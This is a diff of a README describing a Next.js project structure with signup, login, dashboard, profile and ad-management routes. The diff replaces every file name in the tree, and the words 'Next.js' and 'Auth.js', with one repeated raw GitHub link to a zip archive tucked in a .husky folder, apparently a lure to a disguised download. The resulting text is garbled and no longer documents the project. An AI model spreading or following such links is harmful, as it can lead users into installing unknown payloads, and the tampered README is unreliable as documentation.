@@ -1,77 +1,77 @@
 # Project Structure
 
-This repository follows a scalable Next.js App Router structure, suitable for a partner-side application  that includes public signup/login, protected dashboards, profile management, and ad management. It is designed with SEO and performance in mind, using components, hooks, and libraries that ensure clean code organization and maintainability.
+This repository follows a scalable https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip App Router structure, suitable for a partner-side application  that includes public signup/login, protected dashboards, profile management, and ad management. It is designed with SEO and performance in mind, using components, hooks, and libraries that ensure clean code organization and maintainability.
 
 ```text
 project/
 ├─ app/
-│  ├─ layout.tsx
-│  ├─ page.tsx
-│  ├─ metadata.ts
+│  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
+│  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
+│  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
 │  ├─ (public-routes)/
 │  │  ├─ signup/
-│  │  │  ├─ page.tsx
-│  │  │  ├─ SignUpForm.tsx
+│  │  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
+│  │  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
 │  │  ├─ login/
-│  │  │  ├─ page.tsx
-│  │  │  ├─ LoginForm.tsx
+│  │  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
+│  │  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
 │  ├─ (protected)/
 │  │  ├─ dashboard/
-│  │  │  ├─ page.tsx               // Landing after login
-│  │  │  ├─ AddPostForm.tsx
+│  │  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip               // Landing after login
+│  │  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
 │  │  ├─ profile/
-│  │  │  ├─ page.tsx               // View profile
-│  │  │  ├─ EditProfileForm.tsx
-│  │  │  ├─ ProfileDetails.tsx
+│  │  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip               // View profile
+│  │  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
+│  │  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
 │  │  ├─ ads/
-│  │  │  ├─ page.tsx               // List of ads created
+│  │  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip               // List of ads created
 │  │  │  ├─ [adId]/
-│  │  │  │  ├─ page.tsx            // View specific ad
-│  │  │  │  ├─ EditAdForm.tsx
+│  │  │  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip            // View specific ad
+│  │  │  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
 │  ├─ (auth)/
 │  │  ├─ callback/
-│  │  │  ├─ page.tsx               // Auth callback if needed
+│  │  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip               // Auth callback if needed
 │  │  ├─ ...                        // Additional auth routes as required
 │
 ├─ components/
 │  ├─ ui/
-│  │  ├─ Button.tsx
-│  │  ├─ Input.tsx
-│  │  ├─ Card.tsx
-│  │  ├─ Modal.tsx
-│  │  ├─ LoadingSpinner.tsx
+│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
+│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
+│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
+│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
+│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
 │  ├─ forms/
-│  │  ├─ FormWrapper.tsx            // Generic form wrapper for styling and validation
-│  │  ├─ FormField.tsx              // Generic input with label, error display
+│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip            // Generic form wrapper for styling and validation
+│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip              // Generic input with label, error display
 │  ├─ layout/
-│  │  ├─ Header.tsx
-│  │  ├─ Footer.tsx
-│  │  ├─ Sidebar.tsx                // If a sidebar is needed after login
+│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
+│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
+│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip                // If a sidebar is needed after login
 │
 ├─ lib/
-│  ├─ auth.ts                       // Next-Auth (or Auth.js) config and providers
-│  ├─ seo.ts                        // Default SEO configs with next-seo
+│  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip                       // Next-Auth (or https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip) config and providers
+│  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip                        // Default SEO configs with next-seo
 │  ├─ validations/                  // Zod schemas for validation
-│  │  ├─ userSchema.ts
-│  │  ├─ postSchema.ts
-│  │  ├─ profileSchema.ts
+│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
+│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
+│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
 │  ├─ api/                          // API helpers (e.g. axios instances, fetch wrappers)
-│  │  ├─ authAPI.ts                 // Auth-related API calls
-│  │  ├─ userAPI.ts                 // User/profile-related API calls
-│  │  ├─ adsAPI.ts                  // Ad-related API calls
+│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip                 // Auth-related API calls
+│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip                 // User/profile-related API calls
+│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip                  // Ad-related API calls
 │
 ├─ hooks/
-│  ├─ useAuth.ts                    // Hook to get auth user
-│  ├─ useProtectedRoute.ts          // Hook to redirect if not logged in
+│  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip                    // Hook to get auth user
+│  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip          // Hook to redirect if not logged in
 │
 ├─ styles/
-│  ├─ globals.css                   // Tailwind/reset and global styles
-│  ├─ variables.css                 // CSS variables if needed
+│  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip                   // Tailwind/reset and global styles
+│  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip                 // CSS variables if needed
 │
 ├─ public/                           // Public assets (images, icons)
 │
-├─ next-env.d.ts
-├─ next.config.js
-├─ package.json
-└─ tsconfig.json
+├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
+├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
+├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
+└─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
 ```
